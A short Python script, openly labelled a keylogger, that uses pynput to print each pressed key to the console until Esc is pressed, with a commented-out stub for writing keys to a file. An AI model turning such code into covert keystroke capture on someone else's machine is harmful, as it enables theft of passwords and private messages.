

#keylogger
#python -pynput
#takes down all the input keynotes

from pynput.keyboard import Key, Listener
# with open('rakesh.txt','w') as a:
# 	a.write(key)
def on_release(key):
	if key==Key.esc:
		return False
def on_press(key):
	# ffalakdffffafesafafads
	print('{} is pressed \n'.format(key),end = '')
with Listener(on_press = on_press , on_release = on_release) as listener:
	listener.join()